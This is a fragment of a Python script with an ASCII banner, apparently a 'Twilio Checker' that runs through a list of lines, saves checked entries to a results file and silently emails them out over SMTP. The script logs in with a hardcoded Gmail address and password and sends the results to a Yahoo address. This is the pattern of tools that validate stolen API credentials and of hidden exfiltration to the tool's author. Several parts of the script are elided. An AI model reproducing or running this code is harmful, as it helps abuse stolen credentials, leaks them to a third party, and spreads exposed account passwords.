...
|_   _|      (_) (_)       /  __ \ |             | |   {red}
  | |_      ___| |_  ___   | /  \/ |__ {gr}Zae3m{red} ___| | _____ _ __ {ble}
  | \ \ /\ / / | | |/ _ \  | |   | '_ \ / _ \/ __| |/ / _ \ '__| {wh}
...
with open(link) as fp:
    for star in fp:
        ...
        try:
            ...
            save = open('Results/!Twilio_Checked.txt', 'a')
            save.write(remover+'\n')
            save.close()
            try:
                    server = smtplib.SMTP()
                    ...
                    server.login('amrachraf6690@gmail.com', 'Amramr3@2')
                    server.sendmail('toomaa_89@yahoo.com', 'toomaa_89@yahoo.com', msg)
            except:
                  pass
        except:
